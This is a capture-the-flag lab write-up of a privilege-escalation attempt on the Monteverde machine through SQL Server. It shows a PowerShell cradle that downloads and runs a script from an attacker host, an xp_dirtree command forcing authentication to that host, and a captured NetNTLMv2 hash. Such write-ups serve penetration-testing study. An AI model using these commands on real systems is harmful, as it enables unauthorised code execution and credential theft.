# Alternative way to exploit Monteverde

## Privilege Escalation

We know that there is a **Microsoft SQL Server** running on the box.

To get more information and attack paths out of the database, I will use the tool [PowerUpSQL](https://github.com/NetSPI/PowerUpSQL) and upload it onto the box:
```
IEX(New-Object Net.WebClient).downloadString("http://10.10.14.11:8000/PowerUpSQL.ps1")
```

The [wiki of PowerUpSQL](https://github.com/NetSPI/PowerUpSQL/wiki/PowerUpSQL-Cheat-Sheet) has prepared commands and in this case our goal is to escalate privileges:
```
Invoke-SQLAudit -Verbose
```

It finds a vulnerability that allows us to use the command _xp_dirtree_ to force a SQL Server service account authentication to a remote connection and capture the hash to crack it offline:
```
Vulnerability : Excessive Privilege - Execute xp_dirtree

Description   : xp_dirtree is a native extended stored procedure that can be executed by members of the Public role by default in SQL Server 2000-    2014. Xp_dirtree can be used to force the SQL Server service account to authenticate to a remote attacker. The service account password hash can then be captured + cracked or relayed to gain unauthorized access to systems. This also means xp_dirtree can be used to escalate a lower privileged user to sysadmin when a machine or managed account isnt being used. Thats because the SQL Server service account is a member of the sysadmin role in SQL Server 2000-2014, by default.

IsVulnerable  : Yes
IsExploitable : Yes
Exploited     : No
ExploitCmd    : Crack the password hash offline or relay it to another system.
Details       : The public principal has EXECUTE privileges on the xp_dirtree procedure in the master database.
Reference     : https://blog.netspi.com/executing-smb-relay-attacks-via-sql-server-using-metasploit/
Author        : Scott Sutherland (@_nullbind), NetSPI 2016
```

Starting a listener on our local client:
```
responder -I tun0
```

Using _xp_dirtree_ to authenticate:
```
sqlcmd -Q "xp_dirtree '\\10.10.14.11\test'"
```

After trying to authenticate, it will send the **NetNTLMv2 hash** of the computer account _MONTEVERDE$_:
```
[SMB] NTLMv2-SSP Username : MEGABANK\MONTEVERDE$
[SMB] NTLMv2-SSP Hash     : MONTEVERDE$::MEGABANK:2541571846b183fd:4C11896FAF1BDB25820C96441E35649E:0101000000000000C0653150DE09D20165A04E988306D770000000000200080053004D004200330001001E00570049004E002D00500052004800340039003200520051004100460056000400140053004D00420033002E006C006F00630061006C0003003400570049004E002D00500052004800340039003200520051004100460056002E0053004D00420033002E006C006F00630061006C000500140053004D00420033002E006C006F00630061006C0007000800C0653150DE09D201060004000200000008003000300000000000000000000000003000009A96440E6F57EFD00C86811BDD950D5B39B3A8203C86D2E53DD3BAE0EE8BF6970A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00310031000000000000000000
```

As computer accounts in **Active Directory** have very long and randomly generated passwords, this hash is probably not crackable.
